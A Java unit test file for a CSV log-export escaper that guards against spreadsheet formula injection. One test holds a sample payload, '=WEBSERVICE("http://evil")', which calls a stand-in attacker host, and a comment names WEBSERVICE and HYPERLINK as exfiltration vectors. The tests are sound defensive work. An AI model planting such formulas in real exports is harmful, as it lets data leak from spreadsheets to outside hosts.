package com.electroshop.service;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * The CSV exports are opened in Excel, and the rows they carry are records of
 * what untrusted parties did — product names, audit details, error messages.
 *
 * <p>That combination is what makes formula injection a real risk here rather
 * than a theoretical one: a cell beginning with {@code =} is executed as a
 * formula, and the content of these particular files is, by construction,
 * written by people the system does not trust.</p>
 */
class SystemLogExportServiceTest {

    @Test
    void aCellStartingWithEqualsIsNeutralised() {
        // Without the apostrophe, Excel evaluates this on open. WEBSERVICE and
        // HYPERLINK in particular turn a spreadsheet into an exfiltration tool.
        String escaped = SystemLogExportService.escape("=WEBSERVICE(\"http://evil\")");

        assertTrue(escaped.startsWith("\"'="), "formula trebuie prefixată cu apostrof: " + escaped);
    }

    @Test
    void everyFormulaStarterIsCovered() {
        // Excel treats all of these as the beginning of a formula, not only "=".
        for (String starter : new String[]{"=", "+", "-", "@"}) {
            String escaped = SystemLogExportService.escape(starter + "cmd");
            assertTrue(escaped.startsWith("\"'" + starter),
                    "neacoperit: " + starter + " -> " + escaped);
        }
    }

    @Test
    void theApostropheGoesInsideTheQuotesNotOutside() {
        // Order matters. Prefixing after quoting would put the apostrophe outside
        // the field, where it is a visible stray character rather than Excel's
        // "treat as text" marker.
        String escaped = SystemLogExportService.escape("=1+1");

        assertEquals('"', escaped.charAt(0));
        assertEquals('\'', escaped.charAt(1));
    }

    @Test
    void ordinaryTextIsNotPrefixed() {
        // The guard must not corrupt normal content: an apostrophe in front of
        // every product name would be visible in every cell of every export.
        assertEquals("\"Boxă portabilă\"", SystemLogExportService.escape("Boxă portabilă"));
    }

    @Test
    void embeddedQuotesAreDoubled() {
        // CSV's own escaping. Without it a quoted value ends early and every
        // subsequent column shifts by one.
        assertEquals("\"a \"\"b\"\" c\"", SystemLogExportService.escape("a \"b\" c"));
    }

    @Test
    void newlinesAreFlattenedRatherThanEmitted() {
        // A stack trace in a cell would otherwise split one record across many
        // rows, and the file stops being parseable by anything.
        String escaped = SystemLogExportService.escape("prima linie\na doua\r\na treia");

        assertEquals(-1, escaped.indexOf('\n'), "nu trebuie să rămână newline");
        assertEquals(-1, escaped.indexOf('\r'), "nu trebuie să rămână carriage return");
    }

    @Test
    void anEmptyValueProducesAnEmptyFieldRatherThanQuotes() {
        assertEquals("", SystemLogExportService.escape(null));
        assertEquals("", SystemLogExportService.escape(""));
    }
}
